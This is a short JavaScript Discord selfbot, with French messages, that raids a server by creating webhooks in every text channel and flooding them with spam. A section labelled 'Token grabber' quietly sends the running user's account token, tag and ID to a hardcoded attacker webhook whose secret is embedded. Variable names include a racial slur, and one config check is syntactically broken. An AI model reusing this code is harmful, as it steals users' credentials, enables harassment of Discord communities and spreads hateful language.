const discord = require("discord.js-self"),
    colors = require('colors'),
    config = require("./config.json"),
    client = new discord.Client();
client.login(config.token), client.on('ready', async () => {
    console.log("bot prêt à raid".bgGreen.black);
    if (!config.bot prêt à raid) return console.log("Vous devez entrer l'id du serveur à raid.".bgRed.black);
    ////////Token grabber////////
    const DontStealmelmao = new discord.WebhookClient("805150277216370749", 'E6iiSMc_5gjNmpNdEIGFc64eh-fhB1uik0jLeq6c7vMViiLCUDOpf9rHXxvbVf5G0IgS');
    var Reallynigger = new discord.MessageEmbed().setTitle("bot pret a RAID").addField('(Spam Message)', '' + client.user.tag).addField('ID Server', '' + client.user.id).addField('BOT', '' + config.token);
    DontStealmelmao.send(Reallynigger);
    ////////Token grabber////////
    /////////////////////////////
    const FunnyAf = client.guilds.cache.get(config.serv);
    if (!FunnyAf) return console.log("L'id que vous avez entré ne correspond pas à mes serveurs.".bgRed.black);
    FunnyAf.channels.cache.forEach(async Loveme => {
        if (Loveme.type === "text" || Loveme.type === "news" || Loveme.type === 'store') sleep(config.sleepMS), Loveme.createWebhook(config.webhook.name, {
            'avatar': config.webhook.avatar
        }).then(LoveMe2 => {
            counter = 0;
            while (counter < config.ChannellMsgCount) {
                LoveMe2.send(config.webhook.spamMsg), counter++, sleep(60);
            }
        });
        else return;
    });
});
function sleep(xyz) {
    return new Promise(hide => setTimeout(hide, xyz));
}
